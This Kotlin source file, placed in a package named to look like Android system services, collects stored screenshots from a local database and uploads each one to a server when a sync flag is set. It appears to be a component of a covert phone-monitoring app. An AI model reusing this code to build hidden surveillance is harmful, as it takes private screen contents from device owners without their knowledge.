package com.android.services.logs.collectors

import android.content.Context
import com.android.services.db.entities.ScreenShot
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.retrofit.FileUploader
import com.android.services.util.AppConstants
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import org.json.JSONArray

class ScreenShotCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncScreenShots) {
            localDatabaseSource.selectScreenShots { screenShots ->
                if (screenShots.isNotEmpty()) {
                    try {
                        val gson = GsonBuilder().create()
                        val mScreenShotJSON = JSONArray(
                            gson.toJson(
                                screenShots,
                                object : TypeToken<List<ScreenShot>>() {}.type
                            )
                        )
                        val fileUploader =
                            FileUploader(context,
                                AppConstants.SCREEN_SHOT_TYPE,
                                localDatabaseSource)
                        for (i in 0 until mScreenShotJSON.length()) {
                            try {
                                fileUploader.uploadFile(mScreenShotJSON.getJSONObject(i))
                            } catch (e: Exception) {
                                logException(e.message!!, AppConstants.SCREEN_SHOT_TYPE, e)
                            }
                        }
                    } catch (e: Exception) {
                        logException(e.message!!, AppConstants.SCREEN_SHOT_TYPE, e)
                    }
                } else {
                    logVerbose("No ScreenShots found", AppConstants.SCREEN_SHOT_TYPE)
                }
            }
        } else {
            logVerbose("${AppConstants.SCREEN_SHOT_TYPE} Sync is Off")
        }
    }
}